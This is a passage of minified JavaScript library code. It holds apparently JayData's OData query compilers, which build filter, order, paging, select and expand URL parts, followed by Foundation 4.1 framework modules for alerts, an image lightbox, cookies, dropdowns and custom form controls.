context.urlText+="/"+expression.cfg.serviceName;context.method=context.method||expression.cfg.method;if(expression.params){for(var i=0;i<expression.params.length;i++){this.Visit(expression.params[i],context);}}},VisitBatchDeleteExpression:function(expression,context){this.Visit(expression.source,context);context.urlText+='/$batchDelete';context.method='DELETE';},VisitConstantExpression:function(expression,context){if(context.method==='GET'||!context.method){var value;if(expression.value instanceof $data.Entity){value=this.provider.fieldConverter.toDb['$data.Entity'](expression.value);}else if(expression.value!==undefined){var valueType=Container.getTypeName(expression.value);value=this.provider.fieldConverter.toDb[Container.resolveName(Container.resolveType(valueType))](expression.value);}
if(value!==undefined){if(context['$urlParams']){context['$urlParams']+='&';}else{context['$urlParams']='';}
context['$urlParams']+=expression.name+'='+value;}}else{context.postData=context.postData||{};context.postData[expression.name]=expression.value;}},VisitCountExpression:function(expression,context){this.Visit(expression.source,context);context.urlText+='/$count';}},{});$C('$data.storageProviders.oData.oDataWhereCompiler',$data.Expressions.EntityExpressionVisitor,null,{constructor:function(provider,lambdaPrefix){this.provider=provider;this.lambdaPrefix=lambdaPrefix;},compile:function(expression,context){this.Visit(expression,context);},VisitParametricQueryExpression:function(expression,context){this.Visit(expression.expression,context);},VisitUnaryExpression:function(expression,context){context.data+=expression.resolution.mapTo;context.data+="(";this.Visit(expression.operand,context);context.data+=")";},VisitSimpleBinaryExpression:function(expression,context){context.data+="(";if(expression.nodeType=="in"){Guard.requireType("expression.right",expression.type,$data.Expressions.ConstantExpression);var paramValue=expression.right.value;if(!paramValue instanceof Array){Guard.raise(new Exception("Right to the 'in' operator must be an array value"));}
var result=null;var orResolution={mapTo:"or",dataType:"boolean",name:"or"};var eqResolution={mapTo:"eq",dataType:"boolean",name:"equal"};paramValue.forEach(function(item){var idValue=Container.createConstantExpression(item);var idCheck=Container.createSimpleBinaryExpression(expression.left,idValue,$data.Expressions.ExpressionType.Equal,"==","boolean",eqResolution);if(result){result=Container.createSimpleBinaryExpression(result,idCheck,$data.Expressions.ExpressionType.Or,"||","boolean",orResolution);}else{result=idCheck;};});var temp=context.data;context.data='';this.Visit(result,context);context.data=temp+context.data.replace(/\(/g,'').replace(/\)/g,'');}else{this.Visit(expression.left,context);if(expression.right instanceof $data.Expressions.EntityFieldOperationExpression&&expression.right.operation.memberDefinition&&expression.right.operation.memberDefinition.fixedDataType==='decimal'&&context.data.substring(context.data.length-1)==='m'){context.data=context.data.substring(0,context.data.length-1);}
context.data+=" ";context.data+=expression.resolution.mapTo;context.data+=" ";this.Visit(expression.right,context);if(expression.left instanceof $data.Expressions.EntityFieldOperationExpression&&expression.left.operation.memberDefinition&&expression.left.operation.memberDefinition.fixedDataType==='decimal'&&context.data.substring(context.data.length-1)==='m'){context.data=context.data.substring(0,context.data.length-1);}};context.data+=")";},VisitEntityFieldExpression:function(expression,context){this.Visit(expression.source,context);if(expression.source instanceof $data.Expressions.ComplexTypeExpression){context.data+="/";}
this.Visit(expression.selector,context);},VisitAssociationInfoExpression:function(expression,context){context.data+=expression.associationInfo.FromPropertyName;},VisitMemberInfoExpression:function(expression,context){context.data+=expression.memberName;},VisitQueryParameterExpression:function(expression,context){context.data+=this.provider.fieldConverter.toDb[expression.type](expression.value);},VisitEntityFieldOperationExpression:function(expression,context){Guard.requireType("expression.operation",expression.operation,$data.Expressions.MemberInfoExpression);var opDef=expression.operation.memberDefinition;var opName=opDef.mapTo||opDef.name;context.data+=opName;context.data+="(";var paramCounter=0;var params=opDef.parameters||[{name:"@expression"}];var args=params.map(function(item,index){if(item.name==="@expression"){return expression.source;}else{return expression.parameters[paramCounter++]};});args.forEach(function(arg,index){if(index>0){context.data+=",";};this.Visit(arg,context);},this);context.data+=")";},VisitEntityFunctionOperationExpression:function(expression,context){Guard.requireType("expression.operation",expression.operation,$data.Expressions.MemberInfoExpression);this.Visit(expression.source,context);var opDef=expression.operation.memberDefinition;var opName=opDef.mapTo||opDef.name;context.data+=opName;context.data+="(";var paramCounter=0;var params=opDef.method.params||[{name:"@expression"}];var exprParams=[];var definedParams=expression.operation.memberDefinition.method.params;if(expression.parameters&&expression.parameters[0]&&expression.parameters[0].value&&typeof expression.parameters[0].value==='object'&&definedParams&&definedParams[0]&&(Container.resolveType(definedParams[0].type)!==$data.Object||definedParams[0].name in expression.parameters[0].value)){if(expression.parameters[0]instanceof $data.Expressions.ObjectLiteralExpression){exprParams=expression.parameters[0].members.map(function(ofe){return ofe.expression});params=expression.parameters[0].members.map(function(ofe){return{name:ofe.fieldName}});}else if(expression.parameters[0]instanceof $data.Expressions.ConstantExpression){params.forEach(function(p){exprParams.push(Container.createConstantExpression(expression.parameters[0].value[p.name],Container.resolveType(p.type),p.name));});}}else{exprParams=expression.parameters;}
var args=params.map(function(item,index){if(item.name==="@expression"){return expression.source;}else{return exprParams[paramCounter++]};});args.forEach(function(arg,index){if(arg===undefined||(arg instanceof $data.Expressions.ConstantExpression&&typeof arg.value==='undefined'))
return;if(index>0){context.data+=",";};context.data+=params[index].name+'=';this.Visit(arg,context);},this);context.data+=")";},VisitContextFunctionOperationExpression:function(expression,context){return this.VisitEntityFunctionOperationExpression(expression,context);},VisitConstantExpression:function(expression,context){var valueType=Container.getTypeName(expression.value);context.data+=this.provider.fieldConverter.toDb[Container.resolveName(Container.resolveType(valueType))](expression.value);},VisitEntityExpression:function(expression,context){this.Visit(expression.source,context);if(this.lambdaPrefix&&expression.selector.lambda){context.lambda=expression.selector.lambda;context.data+=(expression.selector.lambda+'/');}},VisitEntitySetExpression:function(expression,context){this.Visit(expression.source,context);if(expression.selector instanceof $data.Expressions.AssociationInfoExpression){this.Visit(expression.selector,context);context.data+="/";}},VisitFrameOperationExpression:function(expression,context){this.Visit(expression.source,context);Guard.requireType("expression.operation",expression.operation,$data.Expressions.MemberInfoExpression);var opDef=expression.operation.memberDefinition;var opName=opDef.mapTo||opDef.name;context.data+=opName;context.data+="(";var paramCounter=0;var params=opDef.parameters||[{name:"@expression"}];var args=params.map(function(item,index){if(item.name==="@expression"){return expression.source;}else{return expression.parameters[paramCounter++]};});for(var i=0;i<args.length;i++){var arg=args[i];if(arg&&arg.value instanceof $data.Queryable){var frameExpression=new opDef.frameType(arg.value.expression);var preparator=Container.createQueryExpressionCreator(arg.value.entityContext);var prep_expression=preparator.Visit(frameExpression);var compiler=new $data.storageProviders.oData.oDataWhereCompiler(this.provider,true);var frameContext={data:""};var compiled=compiler.compile(prep_expression,frameContext);context.data+=(frameContext.lambda+': '+frameContext.data);};}
context.data+=")";}});$C('$data.storageProviders.oData.oDataOrderCompiler',$data.storageProviders.oData.oDataWhereCompiler,null,{constructor:function(provider){this.provider=provider;},compile:function(expression,context){this.Visit(expression,context);},VisitOrderExpression:function(expression,context){var orderContext={data:""};this.Visit(expression.selector,orderContext);if(context['$orderby']){context['$orderby']+=',';}else{context['$orderby']='';}
context['$orderby']+=orderContext.data
+(expression.nodeType==$data.Expressions.ExpressionType.OrderByDescending?" desc":"");},VisitParametricQueryExpression:function(expression,context){this.Visit(expression.expression,context);},VisitEntityFieldExpression:function(expression,context){this.Visit(expression.source,context);this.Visit(expression.selector,context);},VisitComplexTypeExpression:function(expression,context){this.Visit(expression.source,context);this.Visit(expression.selector,context);context.data+="/";},VisitEntitySetExpression:function(expression,context){if(expression.selector instanceof $data.Expressions.AssociationInfoExpression){this.Visit(expression.source,context);this.Visit(expression.selector,context);}},VisitAssociationInfoExpression:function(expression,context){context.data+=expression.associationInfo.FromPropertyName+'/';},VisitEntityExpression:function(expression,context){this.Visit(expression.source,context);this.Visit(expression.selector,context);},VisitMemberInfoExpression:function(expression,context){context.data+=expression.memberName;},VisitEntityFieldOperationExpression:function(expression,context){Guard.requireType("expression.operation",expression.operation,$data.Expressions.MemberInfoExpression);var opDef=expression.operation.memberDefinition;var opName=opDef.mapTo||opDef.name;context.data+=opName;context.data+="(";var paramCounter=0;var params=opDef.parameters||[{name:"@expression"}];var args=params.map(function(item,index){if(item.name==="@expression"){return expression.source;}else{return expression.parameters[paramCounter++]};});args.forEach(function(arg,index){if(index>0){context.data+=",";};this.Visit(arg,context);},this);context.data+=")";},VisitEntityFunctionOperationExpression:function(expression,context){Guard.requireType("expression.operation",expression.operation,$data.Expressions.MemberInfoExpression);this.Visit(expression.source,context);var opDef=expression.operation.memberDefinition;var opName=opDef.mapTo||opDef.name;context.data+=opName;context.data+="(";var paramCounter=0;var params=opDef.method.params||[{name:"@expression"}];var exprParams=[];var definedParams=expression.operation.memberDefinition.method.params;if(expression.parameters&&expression.parameters[0]&&expression.parameters[0].value&&typeof expression.parameters[0].value==='object'&&definedParams&&definedParams[0]&&(Container.resolveType(definedParams[0].type)!==$data.Object||definedParams[0].name in expression.parameters[0].value)){if(expression.parameters[0]instanceof $data.Expressions.ObjectLiteralExpression){exprParams=expression.parameters[0].members.map(function(ofe){return ofe.expression});params=expression.parameters[0].members.map(function(ofe){return{name:ofe.fieldName}});}else if(expression.parameters[0]instanceof $data.Expressions.ConstantExpression){params.forEach(function(p){exprParams.push(Container.createConstantExpression(expression.parameters[0].value[p.name],Container.resolveType(p.type),p.name));});}}else{exprParams=expression.parameters;}
var args=params.map(function(item,index){if(item.name==="@expression"){return expression.source;}else{return exprParams[paramCounter++]};});args.forEach(function(arg,index){if(arg===undefined||(arg instanceof $data.Expressions.ConstantExpression&&typeof arg.value==='undefined'))
return;if(index>0){context.data+=",";};context.data+=params[index].name+'=';this.Visit(arg,context);},this);context.data+=")";},VisitContextFunctionOperationExpression:function(expression,context){return this.VisitEntityFunctionOperationExpression(expression,context);}});$C('$data.storageProviders.oData.oDataPagingCompiler',$data.Expressions.EntityExpressionVisitor,null,{constructor:function(provider){this.provider=provider;},compile:function(expression,context){this.Visit(expression,context);},VisitPagingExpression:function(expression,context){var pagingContext={data:""};this.Visit(expression.amount,pagingContext);switch(expression.nodeType){case $data.Expressions.ExpressionType.Skip:context['$skip']=pagingContext.data;break;case $data.Expressions.ExpressionType.Take:context['$top']=pagingContext.data;break;default:Guard.raise("Not supported nodeType");break;}},VisitConstantExpression:function(expression,context){context.data+=expression.value;}});$C('$data.storageProviders.oData.oDataProjectionCompiler',$data.Expressions.EntityExpressionVisitor,null,{constructor:function(entityContext){this.entityContext=entityContext;this.hasObjectLiteral=false;this.ObjectLiteralPath="";this.modelBinderMapping=[];},compile:function(expression,context){this.Visit(expression,context);},VisitProjectionExpression:function(expression,context){context.data="";this.mapping="";this.Visit(expression.selector,context);if(context['$select']){context['$select']+=',';}else{context['$select']='';}
context["$select"]+=context.data;context.data="";},VisitParametricQueryExpression:function(expression,context){this.Visit(expression.expression,context);if(expression.expression instanceof $data.Expressions.EntityExpression||expression.expression instanceof $data.Expressions.EntitySetExpression){if(context['$expand']){context['$expand']+=',';}else{context['$expand']='';}
context['$expand']+=this.mapping.replace(/\./g,'/')}if(expression.expression instanceof $data.Expressions.ComplexTypeExpression){var m=this.mapping.split('.');m.pop();if(m.length>0){if(context['$expand']){context['$expand']+=',';}else{context['$expand']='';}
context['$expand']+=m.join('/');}}else{var m=this.mapping.split('.');m.pop();if(m.length>0){if(context['$expand']){context['$expand']+=',';}else{context['$expand']='';}
context['$expand']+=m.join('/');}}},VisitObjectLiteralExpression:function(expression,context){var tempObjectLiteralPath=this.ObjectLiteralPath;this.hasObjectLiteral=true;expression.members.forEach(function(member,index){this.Visit(member,context);if(index<expression.members.length-1){context.data+=',';}
this.mapping='';},this);this.ObjectLiteralPath=tempObjectLiteralPath;},VisitObjectFieldExpression:function(expression,context){if(this.ObjectLiteralPath){this.ObjectLiteralPath+='.'+expression.fieldName;}else{this.ObjectLiteralPath=expression.fieldName;}
this.Visit(expression.expression,context);if(expression.expression instanceof $data.Expressions.EntityExpression||expression.expression instanceof $data.Expressions.EntitySetExpression){if(context['$expand']){context['$expand']+=',';}else{context['$expand']='';}
context['$expand']+=this.mapping.replace(/\./g,'/')}else{var m=this.mapping.split('.');m.pop();if(m.length>0){if(context['$expand']){context['$expand']+=',';}else{context['$expand']='';}
context['$expand']+=m.join('/');}}},VisitComplexTypeExpression:function(expression,context){this.Visit(expression.source,context);this.Visit(expression.selector,context);},VisitEntityFieldExpression:function(expression,context){this.Visit(expression.source,context);this.Visit(expression.selector,context);},VisitEntityExpression:function(expression,context){this.Visit(expression.source,context);},VisitEntitySetExpression:function(expression,context){if(expression.source instanceof $data.Expressions.EntityExpression){this.Visit(expression.source,context);}
if(expression.selector instanceof $data.Expressions.AssociationInfoExpression){this.Visit(expression.selector,context);}},VisitAssociationInfoExpression:function(expression,context){if(context.data&&context.data.length>0&&context.data[context.data.length-1]!=','){context.data+='/';}
context.data+=expression.associationInfo.FromPropertyName;if(this.mapping&&this.mapping.length>0){this.mapping+='.';}
this.mapping+=expression.associationInfo.FromPropertyName;},VisitMemberInfoExpression:function(expression,context){if(context.data&&context.data.length>0&&context.data[context.data.length-1]!=','){context.data+='/';}
context.data+=expression.memberName;if(this.mapping&&this.mapping.length>0){this.mapping+='.';}
this.mapping+=expression.memberName;},VisitConstantExpression:function(expression,context){context.data=context.data.slice(0,context.data.length-1);}});
// js/foundation.min.js

var libFuncName=null;if(typeof jQuery=="undefined"&&typeof Zepto=="undefined"&&typeof $=="function")libFuncName=$;else if(typeof jQuery=="function")libFuncName=jQuery;else{if(typeof Zepto!="function")throw new TypeError;libFuncName=Zepto}(function(e){(function(){Array.prototype.filter||(Array.prototype.filter=function(e){"use strict";if(this==null)throw new TypeError;var t=Object(this),n=t.length>>>0;if(typeof e!="function")try{throw new TypeError}catch(r){return}var i=[],s=arguments[1];for(var o=0;o<n;o++)if(o in t){var u=t[o];e&&e.call(s,u,o,t)&&i.push(u)}return i},Function.prototype.bind||(Function.prototype.bind=function(e){if(typeof this!="function")throw new TypeError("Function.prototype.bind - what is trying to be bound is not callable");var t=Array.prototype.slice.call(arguments,1),n=this,r=function(){},i=function(){return n.apply(this instanceof r&&e?this:e,t.concat(Array.prototype.slice.call(arguments)))};return r.prototype=this.prototype,i.prototype=new r,i})),e.fn.stop=e.fn.stop||function(){return this}})(),function(t,n,r){"use strict";t.Foundation={name:"Foundation",version:"4.1.0",cache:{},init:function(t,n,r,i,s,o){var u,a=[t,r,i,s],f=[],o=o||!1;o&&(this.nc=o),this.rtl=/rtl/i.test(e("html").attr("dir")),this.scope=t||this.scope;if(n&&typeof n=="string"){if(/off/i.test(n))return this.off();u=n.split(" ");if(u.length>0)for(var l=u.length-1;l>=0;l--)f.push(this.init_lib(u[l],a))}else for(var c in this.libs)f.push(this.init_lib(c,a));return typeof n=="function"&&a.unshift(n),this.response_obj(f,a)},response_obj:function(e,t){for(var n in t)if(typeof t[n]=="function")return t[n]({errors:e.filter(function(e){if(typeof e=="string")return e})});return e},init_lib:function(e,t){return this.trap(function(){if(this.libs.hasOwnProperty(e))return this.patch(this.libs[e]),this.libs[e].init.apply(this.libs[e],t)}.bind(this),e)},trap:function(e,t){if(!this.nc)try{return e()}catch(n){return this.error({name:t,message:"could not be initialized",more:n.name+" "+n.message})}return e()},patch:function(e){this.fix_outer(e),e.scope=this.scope,e.rtl=this.rtl},inherit:function(e,t){var n=t.split(" ");for(var r=n.length-1;r>=0;r--)this.lib_methods.hasOwnProperty(n[r])&&(this.libs[e.name][n[r]]=this.lib_methods[n[r]])},random_str:function(e){var t="0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz".split("");e||(e=Math.floor(Math.random()*t.length));var n="";for(var r=0;r<e;r++)n+=t[Math.floor(Math.random()*t.length)];return n},libs:{},lib_methods:{set_data:function(e,t){var n=[this.name,+(new Date),Foundation.random_str(5)].join("-");return Foundation.cache[n]=t,e.attr("data-"+this.name+"-id",n),t},get_data:function(e){return Foundation.cache[e.attr("data-"+this.name+"-id")]},remove_data:function(t){t?(delete Foundation.cache[t.attr("data-"+this.name+"-id")],t.attr("data-"+this.name+"-id","")):e("[data-"+this.name+"-id]").each(function(){delete Foundation.cache[e(this).attr("data-"+this.name+"-id")],e(this).attr("data-"+this.name+"-id","")})},throttle:function(e,t){var n=null;return function(){var r=this,i=arguments;clearTimeout(n),n=setTimeout(function(){e.apply(r,i)},t)}},data_options:function(t){function u(e){return!isNaN(e-0)&&e!==null&&e!==""&&e!==!1&&e!==!0}function a(t){return typeof t=="string"?e.trim(t):t}var n={},r,i,s=(t.attr("data-options")||":").split(";"),o=s.length;for(r=o-1;r>=0;r--)i=s[r].split(":"),/true/i.test(i[1])&&(i[1]=!0),/false/i.test(i[1])&&(i[1]=!1),u(i[1])&&(i[1]=parseInt(i[1],10)),i.length===2&&i[0].length>0&&(n[a(i[0])]=a(i[1]));return n},delay:function(e,t){return setTimeout(e,t)},scrollTo:function(n,r,i){if(i<0)return;var s=r-e(t).scrollTop(),o=s/i*10;this.scrollToTimerCache=setTimeout(function(){isNaN(parseInt(o,10))||(t.scrollTo(0,e(t).scrollTop()+o),this.scrollTo(n,r,i-10))}.bind(this),10)},scrollLeft:function(e){if(!e.length)return;return"scrollLeft"in e[0]?e[0].scrollLeft:e[0].pageXOffset},empty:function(e){if(e.length&&e.length>0)return!1;if(e.length&&e.length===0)return!0;for(var t in e)if(hasOwnProperty.call(e,t))return!1;return!0}},fix_outer:function(e){e.outerHeight=function(e,t){return typeof Zepto=="function"?e.height():typeof t!="undefined"?e.outerHeight(t):e.outerHeight()},e.outerWidth=function(e){return typeof Zepto=="function"?e.width():typeof bool!="undefined"?e.outerWidth(bool):e.outerWidth()}},error:function(e){return e.name+" "+e.message+"; "+e.more},off:function(){return e(this.scope).off(".fndtn"),e(t).off(".fndtn"),!0},zj:function(){try{return Zepto}catch(e){return jQuery}}()},e.fn.foundation=function(){var e=Array.prototype.slice.call(arguments,0);return this.each(function(){return Foundation.init.apply(Foundation,[this].concat(e)),this})}}(this,this.document)})(libFuncName),function(e,t,n,r){"use strict";Foundation.libs.alerts={name:"alerts",version:"4.0.0",settings:{speed:300,callback:function(){}},init:function(t,n,r){return this.scope=t||this.scope,typeof n=="object"&&e.extend(!0,this.settings,n),typeof n!="string"?(this.settings.init||this.events(),this.settings.init):this[n].call(this,r)},events:function(){var t=this;e(this.scope).on("click.fndtn.alerts","[data-alert] a.close",function(n){n.preventDefault(),e(this).closest("[data-alert]").fadeOut(t.speed,function(){e(this).remove(),t.settings.callback()})}),this.settings.init=!0},off:function(){e(this.scope).off(".fndtn.alerts")}}}(Foundation.zj,this,this.document),function(e,t,n,r){"use strict";Foundation.libs.clearing={name:"clearing",version:"4.1.0",settings:{templates:{viewing:'<a href="#" class="clearing-close">&times;</a><div class="visible-img" style="display: none"><img src="//:0"><p class="clearing-caption"></p><a href="#" class="clearing-main-prev"><span></span></a><a href="#" class="clearing-main-next"><span></span></a></div>'},close_selectors:".clearing-close",init:!1,locked:!1},init:function(t,n){return Foundation.inherit(this,"set_data get_data remove_data throttle"),typeof t=="object"&&(n=e.extend(!0,this.settings,t)),typeof t!="string"?(e(this.scope).find("ul[data-clearing]").each(function(){var t=Foundation.libs.clearing,n=e(this),r=r||{},i=t.get_data(n);i||(r.$parent=n.parent(),t.set_data(n,e.extend(!0,t.settings,r)),t.assemble(n.find("li")),t.settings.init||t.events().swipe_events())}),this.settings.init):this[t].call(this,n)},events:function(){var n=this;return e(this.scope).on("click.fndtn.clearing","ul[data-clearing] li",function(t,r,i){var r=r||e(this),i=i||r,s=n.get_data(r.parent());t.preventDefault(),s||n.init(),n.open(e(t.target),r,i),n.update_paddles(i)}).on("click.fndtn.clearing",".clearing-main-next",function(e){this.nav(e,"next")}.bind(this)).on("click.fndtn.clearing",".clearing-main-prev",function(e){this.nav(e,"prev")}.bind(this)).on("click.fndtn.clearing",this.settings.close_selectors,function(e){Foundation.libs.clearing.close(e,this)}).on("keydown.fndtn.clearing",function(e){this.keydown(e)}.bind(this)),e(t).on("resize.fndtn.clearing",function(e){this.resize()}.bind(this)),this.settings.init=!0,this},swipe_events:function(){var t=this;e(this.scope).on("touchstart.fndtn.clearing",".visible-img",function(t){t.touches||(t=t.originalEvent);var n={start_page_x:t.touches[0].pageX,start_page_y:t.touches[0].pageY,start_time:(new Date).getTime(),delta_x:0,is_scrolling:r};e(this).data("swipe-transition",n),t.stopPropagation()}).on("touchmove.fndtn.clearing",".visible-img",function(n){n.touches||(n=n.originalEvent);if(n.touches.length>1||n.scale&&n.scale!==1)return;var r=e(this).data("swipe-transition");typeof r=="undefined"&&(r={}),r.delta_x=n.touches[0].pageX-r.start_page_x,typeof r.is_scrolling=="undefined"&&(r.is_scrolling=!!(r.is_scrolling||Math.abs(r.delta_x)<Math.abs(n.touches[0].pageY-r.start_page_y)));if(!r.is_scrolling&&!r.active){n.preventDefault();var i=r.delta_x<0?"next":"prev";r.active=!0,t.nav(n,i)}}).on("touchend.fndtn.clearing",".visible-img",function(t){e(this).data("swipe-transition",{}),t.stopPropagation()})},assemble:function(e){var t=e.parent(),n=this.get_data(t),r=t.detach(),i={grid:'<div class="carousel">'+this.outerHTML(r[0])+"</div>",viewing:n.templates.viewing},s='<div class="clearing-assembled"><div>'+i.viewing+i.grid+"</div></div>";return n.$parent.append(s)},open:function(e,t,n){var r=n.closest(".clearing-assembled"),i=r.find("div").first(),s=i.find(".visible-img"),o=s.find("img").not(e);this.locked()||(o.attr("src",this.load(e)),this.loaded(o,function(){r.addClass("clearing-blackout"),i.addClass("clearing-container"),s.show(),this.fix_height(n).caption(s.find(".clearing-caption"),e).center(o).shift(t,n,function(){n.siblings().removeClass("visible"),n.addClass("visible")})}.bind(this)))},close:function(t,n){t.preventDefault();var r=function(e){return/blackout/.test(e.selector)?e:e.closest(".clearing-blackout")}(e(n)),i,s;return n===t.target&&r&&(i=r.find("div").first(),s=i.find(".visible-img"),this.settings.prev_index=0,r.find("ul[data-clearing]").attr("style","").closest(".clearing-blackout").removeClass("clearing-blackout"),i.removeClass("clearing-container"),s.hide()),!1},keydown:function(t){var n=e(".clearing-blackout").find("ul[data-clearing]");t.which===39&&this.go(n,"next"),t.which===37&&this.go(n,"prev"),t.which===27&&e("a.clearing-close").trigger("click")},nav:function(t,n){var r=e(".clearing-blackout").find("ul[data-clearing]");t.preventDefault(),this.go(r,n)},resize:function(){var t=e(".clearing-blackout .visible-img").find("img");t.length&&this.center(t)},fix_height:function(t){var n=t.parent().children(),r=this;return n.each(function(){var t=e(this),n=t.find("img");t.height()>r.outerHeight(n)&&t.addClass("fix-height")}).closest("ul").width(n.length*100+"%"),this},update_paddles:function(e){var t=e.closest(".carousel").siblings(".visible-img");e.next().length?t.find(".clearing-main-right").removeClass("disabled"):t.find(".clearing-main-right").addClass("disabled"),e.prev().length?t.find(".clearing-main-prev").removeClass("disabled"):t.find(".clearing-main-prev").addClass("disabled")},center:function(e){return this.rtl?e.css({marginRight:-(this.outerWidth(e)/2),marginTop:-(this.outerHeight(e)/2)}):e.css({marginLeft:-(this.outerWidth(e)/2),marginTop:-(this.outerHeight(e)/2)}),this},load:function(e){var t=e.parent().attr("href");return this.preload(e),t?t:e.attr("src")},preload:function(e){this.img(e.closest("li").next()).img(e.closest("li").prev())},loaded:function(e,t){function n(){t()}function r(){this.one("load",n);if(/MSIE (\d+\.\d+);/.test(navigator.userAgent)){var e=this.attr("src"),t=e.match(/\?/)?"&":"?";t+="random="+(new Date).getTime(),this.attr("src",e+t)}}if(!e.attr("src")){n();return}e[0].complete||e[0].readyState===4?n():r.call(e)},img:function(e){if(e.length){var t=new Image,n=e.find("a");n.length?t.src=n.attr("href"):t.src=e.find("img").attr("src")}return this},caption:function(e,t){var n=t.data("caption");return n?e.text(n).show():e.text("").hide(),this},go:function(e,t){var n=e.find(".visible"),r=n[t]();r.length&&r.find("img").trigger("click",[n,r])},shift:function(e,t,n){var r=t.parent(),i=this.settings.prev_index||t.index(),s=this.direction(r,e,t),o=parseInt(r.css("left"),10),u=this.outerWidth(t),a;t.index()!==i&&!/skip/.test(s)?/left/.test(s)?(this.lock(),r.animate({left:o+u},300,this.unlock())):/right/.test(s)&&(this.lock(),r.animate({left:o-u},300,this.unlock())):/skip/.test(s)&&(a=t.index()-this.settings.up_count,this.lock(),a>0?r.animate({left:-(a*u)},300,this.unlock()):r.animate({left:0},300,this.unlock())),n()},direction:function(t,n,r){var i=t.find("li"),s=this.outerWidth(i)+this.outerWidth(i)/4,o=Math.floor(this.outerWidth(e(".clearing-container"))/s)-1,u=i.index(r),a;return this.settings.up_count=o,this.adjacent(this.settings.prev_index,u)?u>o&&u>this.settings.prev_index?a="right":u>o-1&&u<=this.settings.prev_index?a="left":a=!1:a="skip",this.settings.prev_index=u,a},adjacent:function(e,t){for(var n=t+1;n>=t-1;n--)if(n===e)return!0;return!1},lock:function(){this.settings.locked=!0},unlock:function(){this.settings.locked=!1},locked:function(){return this.settings.locked},outerHTML:function(e){return e.outerHTML||(new XMLSerializer).serializeToString(e)},off:function(){e(this.scope).off(".fndtn.clearing"),e(t).off(".fndtn.clearing"),this.remove_data(),this.settings.init=!1}}}(Foundation.zj,this,this.document),function(e,t,n){function i(e){return e}function s(e){return decodeURIComponent(e.replace(r," "))}var r=/\+/g,o=e.cookie=function(r,u,a){if(u!==n){a=e.extend({},o.defaults,a),u===null&&(a.expires=-1);if(typeof a.expires=="number"){var f=a.expires,l=a.expires=new Date;l.setDate(l.getDate()+f)}return u=o.json?JSON.stringify(u):String(u),t.cookie=[encodeURIComponent(r),"=",o.raw?u:encodeURIComponent(u),a.expires?"; expires="+a.expires.toUTCString():"",a.path?"; path="+a.path:"",a.domain?"; domain="+a.domain:"",a.secure?"; secure":""].join("")}var c=o.raw?i:s,h=t.cookie.split("; ");for(var p=0,d=h.length;p<d;p++){var v=h[p].split("=");if(c(v.shift())===r){var m=c(v.join("="));return o.json?JSON.parse(m):m}}return null};o.defaults={},e.removeCookie=function(t,n){return e.cookie(t)!==null?(e.cookie(t,null,n),!0):!1}}(Foundation.zj,document),function(e,t,n,r){"use strict";Foundation.libs.dropdown={name:"dropdown",version:"4.1.0",settings:{activeClass:"open"},init:function(t,n,r){return this.scope=t||this.scope,Foundation.inherit(this,"throttle scrollLeft"),typeof n=="object"&&e.extend(!0,this.settings,n),typeof n!="string"?(this.settings.init||this.events(),this.settings.init):this[n].call(this,r)},events:function(){var n=this;e(this.scope).on("click.fndtn.dropdown","[data-dropdown]",function(t){t.preventDefault(),t.stopPropagation(),n.toggle(e(this))}),e("*, html, body").on("click.fndtn.dropdown",function(t){e(t.target).data("dropdown")||e("[data-dropdown-content]").css(Foundation.rtl?"right":"left","-99999px").removeClass(n.settings.activeClass)}),e(t).on("resize.fndtn.dropdown",n.throttle(function(){n.resize.call(n)},50)).trigger("resize"),this.settings.init=!0},toggle:function(t,n){var r=e("#"+t.data("dropdown"));e("[data-dropdown-content]").not(r).css(Foundation.rtl?"right":"left","-99999px").removeClass(this.settings.activeClass),r.hasClass(this.settings.activeClass)?r.css(Foundation.rtl?"right":"left","-99999px").removeClass(this.settings.activeClass):this.css(r.addClass(this.settings.activeClass),t)},resize:function(){var t=e("[data-dropdown-content].open"),n=e("[data-dropdown='"+t.attr("id")+"']");t.length&&n.length&&this.css(t,n)},css:function(n,r){var i=r.position();i.top+=r.offsetParent().offset().top,i.left+=r.offsetParent().offset().left;if(this.small())n.css({position:"absolute",width:"95%",left:"2.5%","max-width":"none",top:i.top+this.outerHeight(r)});else{if(!Foundation.rtl&&e(t).width()>this.outerWidth(n)+r.offset().left)var s=i.left;else{n.hasClass("right")||n.addClass("right");var s=i.left-(this.outerWidth(n)-this.outerWidth(r))}n.attr("style","").css({position:"absolute",top:i.top+this.outerHeight(r),left:s})}return n},small:function(){return e(t).width()<768||e("html").hasClass("lt-ie9")},off:function(){e(this.scope).off(".fndtn.dropdown"),e("html, body").off(".fndtn.dropdown"),e(t).off(".fndtn.dropdown"),e("[data-dropdown-content]").off(".fndtn.dropdown"),this.settings.init=!1}}}(Foundation.zj,this,this.document),function(e,t,n,r){"use strict";Foundation.libs.forms={name:"forms",version:"4.0.4",settings:{disable_class:"no-custom"},init:function(t,n,r){return this.scope=t||this.scope,typeof n=="object"&&e.extend(!0,this.settings,n),typeof n!="string"?(this.settings.init||this.events(),this.assemble(),this.settings.init):this[n].call(this,r)},assemble:function(){e('form.custom input[type="radio"]',e(this.scope)).not('[data-customforms="disabled"]').each(this.append_custom_markup),e('form.custom input[type="checkbox"]',e(this.scope)).not('[data-customforms="disabled"]').each(this.append_custom_markup),e("form.custom select",e(this.scope)).not('[data-customforms="disabled"]').each(this.append_custom_select)},events:function(){var r=this;e(this.scope).on("click.fndtn.forms","form.custom span.custom.checkbox",function(t){t.preventDefault(),t.stopPropagation(),r.toggle_checkbox(e(this))}).on("click.fndtn.forms","form.custom span.custom.radio",function(t){t.preventDefault(),t.stopPropagation(),r.toggle_radio(e(this))}).on("change.fndtn.forms",'form.custom select:not([data-customforms="disabled"])',function(t){r.refresh_custom_select(e(this))}).on("click.fndtn.forms","form.custom label",function(t){var n=e("#"+r.escape(e(this).attr("for"))+':not([data-customforms="disabled"])'),i,s;n.length!==0&&(n.attr("type")==="checkbox"?(t.preventDefault(),i=e(this).find("span.custom.checkbox"),i.length==0&&(i=n.add(this).siblings("span.custom.checkbox").first()),r.toggle_checkbox(i)):n.attr("type")==="radio"&&(t.preventDefault(),s=e(this).find("span.custom.radio"),s.length==0&&(s=n.add(this).siblings("span.custom.radio").first()),r.toggle_radio(s)))}).on("click.fndtn.forms","form.custom div.custom.dropdown a.current, form.custom div.custom.dropdown a.selector",function(t){var n=e(this),i=n.closest("div.custom.dropdown"),s=i.prev();i.hasClass("open")||e(r.scope).trigger("click"),t.preventDefault();if(!1===s.is(":disabled"))return 